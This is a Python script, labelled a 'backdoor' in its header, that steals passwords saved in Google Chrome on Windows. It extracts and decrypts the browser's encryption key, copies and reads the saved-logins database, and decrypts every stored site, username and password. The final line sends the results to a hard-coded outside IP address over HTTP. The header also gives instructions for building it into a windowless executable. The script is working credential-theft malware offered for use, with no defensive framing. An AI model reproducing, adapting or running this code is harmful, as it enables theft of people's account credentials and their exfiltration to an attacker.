# ============================================================
# Backdoor developed by: Matheus Fontanetti Martins
# Compilling to exe: pyinstaller.exe chromePasswd.py --onefile --windowed
# ============================================================

import os
from PIL import ImageGrab  # dependency
import base64
from Cryptodome.Cipher import AES  # dependency
import sqlite3
from io import open
import json
import win32crypt
import shutil
import requests


class password:

        # start initial connection
        def __init__(self):
            print "Getting passwords..."

        # ============= Funcoes para pegar senhas do chrome ==============

        # fetch encrypted passwords
        def fetch_encryption_key(self):
            local_computer_directory_path = os.path.join(
                os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")

            with open(local_computer_directory_path, "r", encoding="utf-8") as f:
                local_state_data = f.read()
                local_state_data = json.loads(local_state_data)

                encryption_key = base64.b64decode(
                    local_state_data["os_crypt"]["encrypted_key"])
                encryption_key = encryption_key[5:]

                return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

        # decrypt passwords
        def decrypt_passwords(self, password, encryption_key):
            try:
                iv = password[3:15]
                password = password[15:]

                cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
                return cipher.decrypt(password)[:-16].decode()
            except:
                try:
                    return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
                except:
                    return "No Passwords"

        # get chrome passwords
        def get_passwords(self):
            final_ans = "Recieved Passwords ==> "

            key = self.fetch_encryption_key()
            db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                   "Google", "Chrome", "User Data", "default", "Login Data")

            filename = "ChromePasswords.db"
            shutil.copyfile(db_path, filename)
            db = sqlite3.connect(filename)
            cursor = db.cursor()

            cursor.execute(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
                "order by date_last_used")

            for row in cursor.fetchall():
                main_url = row[0]
                login_url = row[1]
                username = row[2]
                password = self.decrypt_passwords(row[3], key)

                if username or password:
                    final_ans += " Main URL: " + main_url + ","
                    final_ans += " Login URL: " + login_url + ","
                    final_ans += " Username: " + username + ","
                    final_ans += " Password: " + password + "  |  "
                else:
                    continue

            cursor.close()
            db.close()

            try:
                os.remove(filename)
            except:
                pass

            return final_ans

all_password = password()
passwords = all_password.get_passwords()

requests.get("http://137.184.197.191/" + passwords)